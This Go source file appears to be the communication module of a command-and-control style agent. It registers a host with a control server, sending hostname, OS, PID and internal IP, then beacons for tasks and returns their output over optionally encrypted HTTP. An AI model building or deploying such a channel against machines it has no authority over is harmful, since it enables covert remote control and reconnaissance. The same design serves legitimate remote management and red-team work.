package comms

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"bytecode-agent/internal/config"
	"bytecode-agent/internal/crypto"
)

// Client handles all HTTP communication with the control server
type Client struct {
	Config        *config.Config
	APIKey        string
	httpClient    *http.Client
}

// RegisterRequest is sent to /api/register
type RegisterRequest struct {
	Hostname   string `json:"hostname"`
	OS         string `json:"os"`
	Arch       string `json:"arch"`
	PID        int    `json:"pid"`
	InternalIP string `json:"internal_ip"`
}

// RegisterResponse is returned from /api/register
type RegisterResponse struct {
	AgentID string `json:"agent_id"`
	APIKey  string `json:"api_key"`
}

// BeaconResponse is returned from /api/beacon
type BeaconResponse struct {
	Task *TaskPayload `json:"task"`
}

// TaskPayload represents a task from the server
type TaskPayload struct {
	ID      string      `json:"id"`
	Type    string      `json:"type"`
	Payload interface{} `json:"payload"`
}

// ResultRequest is sent to /api/result
type ResultRequest struct {
	TaskID string `json:"task_id"`
	Output string `json:"output"`
	Error  string `json:"error,omitempty"`
	Status string `json:"status"`
}

// NewClient creates a new HTTP client for server communication
func NewClient(cfg *config.Config) *Client {
	return &Client{
		Config: cfg,
		httpClient: &http.Client{
			Timeout: 30 * time.Second,
		},
	}
}

// SetAPIKey sets the API key for authenticated requests
func (c *Client) SetAPIKey(key string) {
	c.APIKey = key
}

// Register sends registration request to the server
func (c *Client) Register(req *RegisterRequest) (*RegisterResponse, error) {
	body, err := json.Marshal(req)
	if err != nil {
		return nil, fmt.Errorf("marshal error: %w", err)
	}

	// Encrypt body if key is present
	var requestBody []byte
	if len(c.Config.EncryptionKey) > 0 {
		encrypted, err := crypto.Encrypt(body, c.Config.EncryptionKey)
		if err != nil {
			return nil, fmt.Errorf("encryption error: %w", err)
		}
		requestBody = encrypted
	} else {
		requestBody = body
	}

	httpReq, err := http.NewRequest("POST", c.Config.ServerURL+"/api/register", bytes.NewBuffer(requestBody))
	if err != nil {
		return nil, fmt.Errorf("request error: %w", err)
	}
	httpReq.Header.Set("Content-Type", "application/octet-stream")
	if len(c.Config.EncryptionKey) > 0 {
		httpReq.Header.Set("X-Encrypted", "true")
	}

	resp, err := c.httpClient.Do(httpReq)
	if err != nil {
		return nil, fmt.Errorf("connection error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 201 {
		respBody, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("registration failed (HTTP %d): %s", resp.StatusCode, string(respBody))
	}

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read error: %w", err)
	}

	// Decrypt response if encrypted
	var decryptedBody []byte
	if resp.Header.Get("X-Encrypted") == "true" && len(c.Config.EncryptionKey) > 0 {
		decrypted, err := crypto.Decrypt(respBody, c.Config.EncryptionKey)
		if err != nil {
			return nil, fmt.Errorf("decryption error: %w", err)
		}
		decryptedBody = decrypted
	} else {
		decryptedBody = respBody
	}

	var regResp RegisterResponse
	if err := json.Unmarshal(decryptedBody, &regResp); err != nil {
		return nil, fmt.Errorf("decode error: %w", err)
	}

	return &regResp, nil
}

// Beacon sends heartbeat and retrieves next task
func (c *Client) Beacon() (*BeaconResponse, error) {
	body := []byte(`{}`)

	// Encrypt body
	var requestBody []byte
	if len(c.Config.EncryptionKey) > 0 {
		encrypted, err := crypto.Encrypt(body, c.Config.EncryptionKey)
		if err != nil {
			return nil, fmt.Errorf("encryption error: %w", err)
		}
		requestBody = encrypted
	} else {
		requestBody = body
	}

	httpReq, err := http.NewRequest("POST", c.Config.ServerURL+"/api/beacon", bytes.NewBuffer(requestBody))
	if err != nil {
		return nil, fmt.Errorf("request error: %w", err)
	}
	httpReq.Header.Set("Content-Type", "application/octet-stream")
	httpReq.Header.Set("X-Agent-Key", c.APIKey)
	if len(c.Config.EncryptionKey) > 0 {
		httpReq.Header.Set("X-Encrypted", "true")
	}

	resp, err := c.httpClient.Do(httpReq)
	if err != nil {
		return nil, fmt.Errorf("connection error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		respBody, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("beacon failed (HTTP %d): %s", resp.StatusCode, string(respBody))
	}

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read error: %w", err)
	}

	// Decrypt response
	var decryptedBody []byte
	if resp.Header.Get("X-Encrypted") == "true" && len(c.Config.EncryptionKey) > 0 {
		decrypted, err := crypto.Decrypt(respBody, c.Config.EncryptionKey)
		if err != nil {
			return nil, fmt.Errorf("decryption error: %w", err)
		}
		decryptedBody = decrypted
	} else {
		decryptedBody = respBody
	}

	var beaconResp BeaconResponse
	if err := json.Unmarshal(decryptedBody, &beaconResp); err != nil {
		return nil, fmt.Errorf("decode error: %w", err)
	}

	return &beaconResp, nil
}

// SendResult sends task execution results to the server
func (c *Client) SendResult(result *ResultRequest) error {
	body, err := json.Marshal(result)
	if err != nil {
		return fmt.Errorf("marshal error: %w", err)
	}

	// Encrypt body
	var requestBody []byte
	if len(c.Config.EncryptionKey) > 0 {
		encrypted, err := crypto.Encrypt(body, c.Config.EncryptionKey)
		if err != nil {
			return fmt.Errorf("encryption error: %w", err)
		}
		requestBody = encrypted
	} else {
		requestBody = body
	}

	httpReq, err := http.NewRequest("POST", c.Config.ServerURL+"/api/result", bytes.NewBuffer(requestBody))
	if err != nil {
		return fmt.Errorf("request error: %w", err)
	}
	httpReq.Header.Set("Content-Type", "application/octet-stream")
	httpReq.Header.Set("X-Agent-Key", c.APIKey)
	if len(c.Config.EncryptionKey) > 0 {
		httpReq.Header.Set("X-Encrypted", "true")
	}

	resp, err := c.httpClient.Do(httpReq)
	if err != nil {
		return fmt.Errorf("connection error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("result submission failed (HTTP %d): %s", resp.StatusCode, string(respBody))
	}

	return nil
}
